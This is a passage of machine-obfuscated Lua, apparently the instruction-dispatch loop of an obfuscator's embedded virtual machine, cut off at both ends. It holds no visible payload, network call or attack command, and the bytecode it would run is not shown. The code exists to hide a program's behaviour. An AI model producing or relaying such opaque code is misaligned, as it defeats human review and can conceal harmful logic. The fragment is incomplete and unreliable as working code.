f~=-1 then repeat if f~=3 then a=o[u];break;end;k=o[b];until true;else a=o[u];end else if f>=4 then repeat if 5~=f then f=-2;break;end;c(a,k);until true;else c(a,k);end end else if f>=1 then if f>=0 then repeat if f~=2 then u=e;break;end;b=n;until true;else b=n;end else o=t;end end f=f+1 end r=r+1;t=d[r];until true;else f=0;while f>-1 do if f>=3 then if 5>f then if f~=-1 then repeat if f~=3 then a=o[u];break;end;k=o[b];until true;else a=o[u];end else if f>=4 then repeat if 5~=f then f=-2;break;end;c(a,k);until true;else c(a,k);end end else if f>=1 then if f>=0 then repeat if f~=2 then u=e;break;end;b=n;until true;else b=n;end else o=t;end end f=f+1 end r=r+1;t=d[r];end end end end end end end else if 60>=f then if f>=58 then if f<=58 then if(t[e]<c[t[l]])then r=t[n];else r=r+1;end;else if f~=58 then repeat if f>59 then local l;for f=0,1 do if-1<=f then repeat if f>0 then c[t[e]]=h[t[n]];break;end;l=t[e]c[l](c[l+1])r=r+1;t=d[r];until true;else c[t[e]]=h[t[n]];end end break;end;local o,s;for f=0,4 do if f<2 then if f>=-1 then for l=38,70 do if f~=1 then c[t[e]]=h[t[n]];r=r+1;t=d[r];break;end;c[t[e]]();r=r+1;t=d[r];break;end;else c[t[e]]();r=r+1;t=d[r];end else if 2<f then if f<4 then o=t[e];s=c[t[n]];c[o+1]=s;c[o]=s[t[l]];r=r+1;t=d[r];else c(t[e],t[n]);end else c[t[e]]=h[t[n]];r=r+1;t=d[r];end end end until true;else local o,s;for f=0,4 do if f<2 then if f>=-1 then for l=38,70 do if f~=1 then c[t[e]]=h[t[n]];r=r+1;t=d[r];break;end;c[t[e]]();r=r+1;t=d[r];break;end;else c[t[e]]();r=r+1;t=d[r];end else if 2<f then if f<4 then o=t[e];s=c[t[n]];c[o+1]=s;c[o]=s[t[l]];r=r+1;t=d[r];else c(t[e],t[n]);end else c[t[e]]=h[t[n]];r=r+1;t=d[r];end end end end end else if f==57 then local s;for f=0,4 do if f>1 then if 2<f then if f>=0 then for h=35,68 do if f>3 then if not c[t[e]]then r=r+1;else r=t[n];end;break;end;c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];break;end;else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end else if-3<f then for l=28,58 do if 1~=f then c[t[e]]=h[t[n]];r=r+1;t=d[r];break;end;s=t[e]c[s]=c[s]()r=r+1;t=d[r];break;end;else c[t[e]]=h[t[n]];r=r+1;t=d[r];end end end else c[t[e]]=j(p[t[n]],nil,h);end end else if f>63 then if f<=64 then for f=0,4 do if 1>=f then if-1<=f then repeat if f>0 then c[t[e]]={};r=r+1;t=d[r];break;end;c[t[e]]={};r=r+1;t=d[r];until true;else c[t[e]]={};r=r+1;t=d[r];end else if f<=2 then c[t[e]]={};r=r+1;t=d[r];else if-1~=f then repeat if f~=3 then c[t[e]]=c[t[n]][t[l]];break;end;c[t[e]]={};r=r+1;t=d[r];until true;else c[t[e]]={};r=r+1;t=d[r];end end end end else if f~=61 then repeat if f>65 then c[t[e]]=c[t[n]]+t[l];break;end;for t=t[e],t[n]do c[t]=nil;end;until true;else for t=t[e],t[n]do c[t]=nil;end;end end else if f<=61 then local s;for f=0,4 do if f>=2 then if f<3 then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];else if f~=3 then if c[t[e]]then r=r+1;else r=t[n];end;else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end end else if-1<=f then repeat if f<1 then c[t[e]]=h[t[n]];r=r+1;t=d[r];break;end;s=t[e]c[s]=c[s]()r=r+1;t=d[r];until true;else c[t[e]]=h[t[n]];r=r+1;t=d[r];end end end else if 59<f then for o=20,68 do if f~=62 then local o;for f=0,6 do if 2>=f then if f>=1 then if f>=-3 then for s=10,89 do if f>1 then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];break;end;c[t[e]]=h[t[n]];r=r+1;t=d[r];break;end;else c[t[e]]=h[t[n]];r=r+1;t=d[r];end else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end else if f>4 then if f>2 then for l=21,73 do if f~=6 then c(t[e],t[n]);r=r+1;t=d[r];break;end;o=t[e]c[o]=c[o](s(c,o+1,t[n]))break;end;else o=t[e]c[o]=c[o](s(c,o+1,t[n]))end else if f>1 then repeat if 4>f then c(t[e],t[n]);r=r+1;t=d[r];break;end;c(t[e],t[n]);r=r+1;t=d[r];until true;else c(t[e],t[n]);r=r+1;t=d[r];end end end end break;end;local f,o;c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];f=t[e];o=c[t[n]];c[f+1]=o;c[f]=o[t[l]];r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];f=t[e]c[f](s(c,f+1,t[n]))break;end;else local f,o;c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];f=t[e];o=c[t[n]];c[f+1]=o;c[f]=o[t[l]];r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];f=t[e]c[f](s(c,f+1,t[n]))end end end end end else if 77>=f then if 72>f then if 69>f then if 63~=f then repeat if f~=67 then local f;for s=0,4 do if s<=1 then if s>=-2 then repeat if 1>s then c[t[e]]=h[t[n]];r=r+1;t=d[r];break;end;f=t[e]c[f]=c[f]()r=r+1;t=d[r];until true;else f=t[e]c[f]=c[f]()r=r+1;t=d[r];end else if 2>=s then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];else if s~=1 then repeat if s>3 then if not c[t[e]]then r=r+1;else r=t[n];end;break;end;c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];until true;else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end end end end break;end;local f;f=t[e]c[f]=c[f](c[f+1])r=r+1;t=d[r];c[t[e]][t[n]]=t[l];r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];c[t[e]][t[n]]=c[t[l]];until true;else local f;f=t[e]c[f]=c[f](c[f+1])r=r+1;t=d[r];c[t[e]][t[n]]=t[l];r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];c[t[e]][t[n]]=c[t[l]];end else if f<=69 then c[t[e]]=c[t[n]][t[l]];else if 71==f then local f,a;for o=0,9 do if o<=4 then if 1<o then if o<=2 then f=t[e];a=c[t[n]];c[f+1]=a;c[f]=a[t[l]];r=r+1;t=d[r];else if 2~=o then repeat if 3~=o then c[t[e]]={};r=r+1;t=d[r];break;end;c(t[e],t[n]);r=r+1;t=d[r];until true;else c(t[e],t[n]);r=r+1;t=d[r];end end else if o>=-1 then for h=32,90 do if 1~=o then f=t[e]c[f](s(c,f+1,t[n]))r=r+1;t=d[r];break;end;c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];break;end;else f=t[e]c[f](s(c,f+1,t[n]))r=r+1;t=d[r];end end else if o>6 then if o>=8 then if o>5 then for h=47,60 do if 8~=o then c[t[e]]=c[t[n]][t[l]];break;end;f=t[e]c[f]=c[f]()r=r+1;t=d[r];break;end;else f=t[e]c[f]=c[f]()r=r+1;t=d[r];end else c[t[e]]=h[t[n]];r=r+1;t=d[r];end else if 4<o then for f=43,91 do if o~=6 then c[t[e]][t[n]]=t[l];r=r+1;t=d[r];break;end;c[t[e]][t[n]]=t[l];r=r+1;t=d[r];break;end;else c[t[e]][t[n]]=t[l];r=r+1;t=d[r];end end end end else local f;for s=0,9 do if s<5 then if 1>=s then if s>=-2 then repeat if s<1 then c[t[e]]=h[t[n]];r=r+1;t=d[r];break;end;c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];until true;else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end else if s<=2 then f=t[e]c[f]=c[f](c[f+1])r=r+1;t=d[r];else if 4>s then c[t[e]]=c[t[n]];r=r+1;t=d[r];else c[t[e]]=h[t[n]];r=r+1;t=d[r];end end end else if s>=7 then if s<=7 then c[t[e]]=h[t[n]];r=r+1;t=d[r];else if 7<=s then for h=48,80 do if 9>s then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];break;end;f=t[e]c[f]=c[f](c[f+1])break;end;else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end end else if s>1 then for h=43,59 do if s~=6 then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];break;end;f=t[e]c[f]=c[f](c[f+1])r=r+1;t=d[r];break;end;else f=t[e]c[f]=c[f](c[f+1])r=r+1;t=d[r];end end end end end end end else if 75>f then if f>=73 then if f==74 then c[t[e]]=c[t[n]][t[l]];else local s;for f=0,4 do if 1<f then if f<3 then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];else if 1~=f then for h=41,83 do if f~=3 then if not c[t[e]]then r=r+1;else r=t[n];end;break;end;c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];break;end;else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end end else if f~=-3 then for l=41,92 do if f>0 then s=t[e]c[s]=c[s]()r=r+1;t=d[r];break;end;c[t[e]]=h[t[n]];r=r+1;t=d[r];break;end;else s=t[e]c[s]=c[s]()r=r+1;t=d[r];end end end end else local f,o;for h=0,7 do if 4>h then if h>=2 then if 0<h then repeat if h~=2 then f=t[e]c[f]=c[f](s(c,f+1,t[n]))r=r+1;t=d[r];break;end;c[t[e]]=c[t[n]];r=r+1;t=d[r];until true;else c[t[e]]=c[t[n]];r=r+1;t=d[r];end else if h>0 then f=t[e];o=c[t[n]];c[f+1]=o;c[f]=o[t[l]];r=r+1;t=d[r];else c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];end end else if 6<=h then if h>=3 then repeat if 7~=h then c[t[e]]=c[t[n]];r=r+1;t=d[r];break;end;r=t[n];until true;else c[t[e]]=c[t[n]];r=r+1;t=d[r];end else if 3~=h then for s=12,93 do if h~=4 then f=t[e]c[f]=c[f](c[f+1])r=r+1;t=d[r];break;end;c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];break;end;else c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];end end end end end else if 76>f then if(t[e]<c[t[l]])then r=r+1;else r=t[n];end;else if f~=73 then for o=48,84 do if 77~=f then local l;c[t[e]]=(t[n]~=0);r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];c[t[e]]=(t[n]~=0);r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];l=t[e]c[l](s(c,l+1,t[n]))r=r+1;t=d[r];do return end;break;end;local f;c[t[e]]=h[t[n]];r=r+1;t=d[r];f=t[e]c[f]=c[f]()r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];f=t[e]c[f](c[f+1])r=r+1;t=d[r];do return end;break;end;else local f;c[t[e]]=h[t[n]];r=r+1;t=d[r];f=t[e]c[f]=c[f]()r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];f=t[e]c[f](c[f+1])r=r+1;t=d[r];do return end;end end end end else if f<=83 then if f<81 then if f>=79 then if f==79 then c[t[e]]=(t[n]~=0);else local f;for o=0,9 do if o<5 then if 2<=o then if 2>=o then c[t[e]]=h[t[n]];r=r+1;t=d[r];else if o==4 then c(t[e],t[n]);r=r+1;t=d[r];else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end end else if-4~=o then for l=30,91 do if 0~=o then f=t[e]c[f]=c[f](s(c,f+1,t[n]))r=r+1;t=d[r];break;end;c[t[e]]=c[t[n]];r=r+1;t=d[r];break;end;else c[t[e]]=c[t[n]];r=r+1;t=d[r];end end else if 6<o then if 7>=o then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];else if 7<=o then repeat if 8~=o then c[t[e]]=c[t[n]][t[l]];break;end;c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];until true;else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end end else if o~=3 then for l=29,96 do if o~=6 then f=t[e]c[f]=c[f](c[f+1])r=r+1;t=d[r];break;end;c[t[e]]=h[t[n]];r=r+1;t=d[r];break;end;else f=t[e]c[f]=c[f](c[f+1])r=r+1;t=d[r];end end end end end else local f,s;for h=0,6 do if h>2 then if 5>h then if 3~=h then c(t[e],t[n]);r=r+1;t=d[r];else c[t[e]]={};r=r+1;t=d[r];end else if 4<=h then repeat if 5~=h then c[t[e]][t[n]]=t[l];break;end;c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];until true;else c[t[e]][t[n]]=t[l];end end else if h>=1 then if-1<=h then repeat if 2>h then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];break;end;f=t[e];s=c[t[n]];c[f+1]=s;c[f]=s[t[l]];r=r+1;t=d[r];until true;else f=t[e];s=c[t[n]];c[f+1]=s;c[f]=s[t[l]];r=r+1;t=d[r];end else f=t[e]c[f](c[f+1])r=r+1;t=d[r];end end end end else if 81<f then if 81~=f then for u=47,71 do if 82<f then local f,k,u,a;for h=0,4 do if 1>=h then if h~=0 then c(t[e],t[n]);r=r+1;t=d[r];else c(t[e],t[n]);r=r+1;t=d[r];end else if 3>h then f=t[e]k,u=b(c[f](s(c,f+1,t[n])))o=u+f-1 a=0;for t=f,o do a=a+1;c[t]=k[a];end;r=r+1;t=d[r];else if h~=-1 then for a=28,86 do if 4~=h then f=t[e]c[f](s(c,f+1,o))r=r+1;t=d[r];break;end;if(c[t[e]]==t[l])then r=r+1;else r=t[n];end;break;end;else if(c[t[e]]==t[l])then r=r+1;else r=t[n];end;end end end end break;end;local f;c[t[e]]();r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=a[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]]*c[t[l]];r=r+1;t=d[r];f=t[e]c[f](c[f+1])break;end;else local f;c[t[e]]();r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=a[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]]*c[t[l]];r=r+1;t=d[r];f=t[e]c[f](c[f+1])end else local s;for f=0,6 do if f>=3 then if 5<=f then if 4<f then repeat if f<6 then c[t[e]]=c[t[n]]*c[t[l]];r=r+1;t=d[r];break;end;s=t[e]c[s](c[s+1])until true;else s=t[e]c[s](c[s+1])end else if f>=2 then repeat if f~=4 then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];break;end;c[t[e]]=a[t[n]];r=r+1;t=d[r];until true;else c[t[e]]=a[t[n]];r=r+1;t=d[r];end end else if f<=0 then c[t[e]]();r=r+1;t=d[r];else if-2<f then repeat if 1<f then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];break;end;c[t[e]]=h[t[n]];r=r+1;t=d[r];until true;else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end end end end end end else if 86<f then if 88>f then local f;c[t[e]]=a[t[n]];r=r+1;t=d[r];f=t[e]c[f]=c[f](s(c,f+1,t[n]))r=r+1;t=d[r];c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];f=t[e]c[f]=c[f](c[f+1])r=r+1;t=d[r];c[t[e]][t[n]]=c[t[l]];else if 89>f then r=t[n];else local o;for f=0,6 do if 2>=f then if f>0 then if f>1 then c[t[e]]=h[t[n]];r=r+1;t=d[r];else o=t[e]c[o](s(c,o+1,t[n]))r=r+1;t=d[r];end else c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];end else if 4<f then if 5~=f then c(t[e],t[n]);else c(t[e],t[n]);r=r+1;t=d[r];end else if-1<f then repeat if 4>f then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];break;end;c(t[e],t[n]);r=r+1;t=d[r];until true;else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end end end end end end else if f>84 then if 83<f then for s=49,73 do if 85<f then local s,o;for f=0,6 do if f>=3 then if 5<=f then if 2<f then repeat if 5~=f then s=t[e];o=c[t[n]];c[s+1]=o;c[s]=o[t[l]];break;end;c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];until true;else s=t[e];o=c[t[n]];c[s+1]=o;c[s]=o[t[l]];end else if 3==f then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end end else if f<1 then c[t[e]]=h[t[n]];r=r+1;t=d[r];else if f~=2 then c[t[e]]=h[t[n]];r=r+1;t=d[r];else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end end end end break;end;for f=0,6 do if f<=2 then if f>=1 then if 1<f then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];else c[t[e]]=h[t[n]];r=r+1;t=d[r];end else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end else if 5>f then if f>3 then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end else if 2<f then repeat if f~=6 then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];break;end;c[t[e]]=c[t[n]][t[l]];until true;else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end end end end break;end;else for f=0,6 do if f<=2 then if f>=1 then if 1<f then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];else c[t[e]]=h[t[n]];r=r+1;t=d[r];end else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end else if 5>f then if f>3 then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end else if 2<f then repeat if f~=6 then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];break;end;c[t[e]]=c[t[n]][t[l]];until true;else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end end end end end else local o,s;for f=0,6 do if f>2 then if 5>f then if f>=-1 then repeat if 3~=f then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];break;end;c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];until true;else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end else if f~=1 then repeat if f~=5 then o=t[e];s=c[t[n]];c[o+1]=s;c[o]=s[t[l]];break;end;c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];until true;else o=t[e];s=c[t[n]];c[o+1]=s;c[o]=s[t[l]];end end else if 1>f then c[t[e]]=h[t[n]];r=r+1;t=d[r];else if f==1 then c[t[e]]=h[t[n]];r=r+1;t=d[r];else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end end end end end end end end end else if f<22 then if 11>f then if 4>=f then if f<2 then if-3<f then for h=27,89 do if f~=1 then local u,h,f,p,_,k;for a=0,4 do if 2<=a then if 2<a then if a~=-1 then for l=44,88 do if a>3 then r=t[n];break;end;c[t[e]]=c[t[n]];r=r+1;t=d[r];break;end;else r=t[n];end else f=t[e]c[f]=c[f](s(c,f+1,o))r=r+1;t=d[r];end else if a>-1 then repeat if 1>a then u=t[n];h=c[u]for t=u+1,t[l]do h=h..c[t];end;c[t[e]]=h;r=r+1;t=d[r];break;end;f=t[e]p,_=b(c[f](s(c,f+1,t[n])))o=_+f-1 k=0;for t=f,o do k=k+1;c[t]=p[k];end;r=r+1;t=d[r];until true;else u=t[n];h=c[u]for t=u+1,t[l]do h=h..c[t];end;c[t[e]]=h;r=r+1;t=d[r];end end end break;end;if(c[t[e]]~=t[l])then r=r+1;else r=t[n];end;break;end;else local u,h,f,p,_,k;for a=0,4 do if 2<=a then if 2<a then if a~=-1 then for l=44,88 do if a>3 then r=t[n];break;end;c[t[e]]=c[t[n]];r=r+1;t=d[r];break;end;else r=t[n];end else f=t[e]c[f]=c[f](s(c,f+1,o))r=r+1;t=d[r];end else if a>-1 then repeat if 1>a then u=t[n];h=c[u]for t=u+1,t[l]do h=h..c[t];end;c[t[e]]=h;r=r+1;t=d[r];break;end;f=t[e]p,_=b(c[f](s(c,f+1,t[n])))o=_+f-1 k=0;for t=f,o do k=k+1;c[t]=p[k];end;r=r+1;t=d[r];until true;else u=t[n];h=c[u]for t=u+1,t[l]do h=h..c[t];end;c[t[e]]=h;r=r+1;t=d[r];end end end end else if f<=2 then local e=t[e];local l=t[l];local d=e+2 local e={c[e](c[e+1],c[d])};for t=1,l do c[d+t]=e[t];end;local e=e[1]if e then c[d]=e r=t[n];else r=r+1;end;else if f==4 then a[t[n]]=c[t[e]];else a[t[n]]=c[t[e]];end end end else if f<=7 then if 6>f then local f;for h=0,4 do if h>=2 then if h<3 then c(t[e],t[n]);r=r+1;t=d[r];else if h>-1 then for l=13,81 do if h~=4 then c(t[e],t[n]);r=r+1;t=d[r];break;end;f=t[e]c[f]=c[f](s(c,f+1,t[n]))break;end;else f=t[e]c[f]=c[f](s(c,f+1,t[n]))end end else if h~=-3 then for f=25,55 do if 1>h then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];break;end;c(t[e],t[n]);r=r+1;t=d[r];break;end;else c(t[e],t[n]);r=r+1;t=d[r];end end end else if 3~=f then for s=20,74 do if f<7 then local f;f=t[e]c[f]=c[f]()r=r+1;t=d[r];c[t[e]]={};r=r+1;t=d[r];c[t[e]][t[n]]=t[l];r=r+1;t=d[r];c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]][t[n]]=t[l];r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];f=t[e]c[f]=c[f]()break;end;if(c[t[e]]<c[t[l]])then r=r+1;else r=t[n];end;break;end;else local f;f=t[e]c[f]=c[f]()r=r+1;t=d[r];c[t[e]]={};r=r+1;t=d[r];c[t[e]][t[n]]=t[l];r=r+1;t=d[r];c[t[e]][t[n]]=c[t[l]];r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]][t[n]]=t[l];r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];f=t[e]c[f]=c[f]()end end else if 9<=f then if 10==f then c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]]-c[t[l]];else h[t[n]]=c[t[e]];end else for f=0,9 do if f<5 then if f<2 then if f>=-4 then for n=34,77 do if f~=1 then c[t[e]]={};r=r+1;t=d[r];break;end;c[t[e]]={};r=r+1;t=d[r];break;end;else c[t[e]]={};r=r+1;t=d[r];end else if f>2 then if f>2 then repeat if f~=4 then c[t[e]][t[n]]=t[l];r=r+1;t=d[r];break;end;c[t[e]]=h[t[n]];r=r+1;t=d[r];until true;else c[t[e]]=h[t[n]];r=r+1;t=d[r];end else c[t[e]]={};r=r+1;t=d[r];end end else if f<7 then if f>=4 then for h=48,81 do if f~=6 then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];break;end;c(t[e],t[n]);r=r+1;t=d[r];break;end;else c(t[e],t[n]);r=r+1;t=d[r];end else if 8<=f then if 5<=f then repeat if f<9 then c[t[e]]=a[t[n]];r=r+1;t=d[r];break;end;c[t[e]]=c[t[n]][t[l]];until true;else c[t[e]]=c[t[n]][t[l]];end else c[t[e]]=a[t[n]];r=r+1;t=d[r];end end end end end end end else if f<=15 then if 13<=f then if 14<=f then if 15>f then local s;for f=0,6 do if 3>f then if 0>=f then c[t[e]]();r=r+1;t=d[r];else if f>-2 then repeat if 2>f then c[t[e]]=h[t[n]];r=r+1;t=d[r];break;end;c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];until true;else c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];end end else if f<=4 then if-1<f then repeat if f>3 then c[t[e]]=a[t[n]];r=r+1;t=d[r];break;end;c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];until true;else c[t[e]]=a[t[n]];r=r+1;t=d[r];end else if f>5 then s=t[e]c[s](c[s+1])else c[t[e]]=c[t[n]]*c[t[l]];r=r+1;t=d[r];end end end end else local f,o;f=t[e];o=c[t[n]];c[f+1]=o;c[f]=o[t[l]];r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];f=t[e]c[f]=c[f](s(c,f+1,t[n]))r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]][t[n]]=t[l];r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];f=t[e];o=c[t[n]];c[f+1]=o;c[f]=o[t[l]];r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];f=t[e]c[f]=c[f](s(c,f+1,t[n]))end else local o,_,u,b,k,f,a;c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];f=0;while f>-1 do if 3<=f then if f>=5 then if f==5 then c(k,b);else f=-2;end else if f>=0 then for t=38,68 do if f~=4 then b=o[u];break;end;k=o[_];break;end;else b=o[u];end end else if 1>f then o=t;else if-2<f then for t=42,68 do if f<2 then _=e;break;end;u=n;break;end;else u=n;end end end f=f+1 end r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];a=t[e]c[a]=c[a](s(c,a+1,t[n]))r=r+1;t=d[r];c[t[e]][t[n]]=c[t[l]];end else if 9~=f then repeat if f~=11 then local t=t[e]c[t](c[t+1])break;end;local o,a,u,p,b,_,k,f;for f=0,6 do if f>2 then if 5<=f then if 3<=f then repeat if f<6 then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];break;end;if not c[t[e]]then r=r+1;else r=t[n];end;until true;else if not c[t[e]]then r=r+1;else r=t[n];end;end else if 3<f then c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];else o=t[e]c[o]=c[o](s(c,o+1,t[n]))r=r+1;t=d[r];end end else if 0<f then if-1~=f then for h=14,76 do if 2>f then o=t[e];a=c[t[n]];c[o+1]=a;c[o]=a[t[l]];r=r+1;t=d[r];break;end;f=0;while f>-1 do if 3>f then if f<1 then u=t;else if f>=-3 then repeat if 1<f then b=n;break;end;p=e;until true;else b=n;end end else if f<=4 then if 3<f then k=u[p];else _=u[b];end else if 4<=f then for t=21,91 do if 6~=f then c(k,_);break;end;f=-2;break;end;else c(k,_);end end end f=f+1 end r=r+1;t=d[r];break;end;else o=t[e];a=c[t[n]];c[o+1]=a;c[o]=a[t[l]];r=r+1;t=d[r];end else c[t[e]]=h[t[n]];r=r+1;t=d[r];end end end until true;else local t=t[e]c[t](c[t+1])end end else if 19<=f then if f<20 then c(t[e],t[n]);r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];c(t[e],t[n]);else if f>=16 then for o=36,92 do if 21>f then local f,o;f=t[e]c[f]=c[f]()r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];f=t[e];o=c[t[n]];c[f+1]=o;c[f]=o[t[l]];r=r+1;t=d[r];c(t[e],t[n]);r=r+1;t=d[r];f=t[e]c[f]=c[f](s(c,f+1,t[n]))r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];break;end;c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=h[t[n]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];r=r+1;t=d[r];c[t[e]]=c[t[n]][t[l]];break;end;else 